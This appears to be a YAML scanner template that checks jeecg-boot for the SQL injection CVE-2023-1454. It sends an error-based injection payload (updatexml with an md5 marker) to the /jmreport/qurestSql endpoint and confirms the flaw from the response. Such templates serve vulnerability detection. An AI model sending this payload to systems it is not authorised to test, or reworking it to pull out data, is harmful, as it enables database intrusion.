name: yaml-poc-jeecg-jeecg-boot-sql_injection-CVE-2023-1454
binding: d3f28f3f-e9c6-475f-a12b-ce2af112f599
detail:
    author: jiapeng.han
    links:
        - https://github.com/J0hnWalker/jeecg-boot-sqli
        - https://vuldb.com/?ctiid.223299
        - https://vuldb.com/?id.223299
    vulnerability:
        id: 45c1aca1-5c16-4aa8-8daf-ce3a53e34177
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /jeecg-boot/jmreport/qurestSql
            headers:
                Content-Type: application/json
            body: |
                {"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5({{s1}}))),1)) or '%%' like '"}
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0()
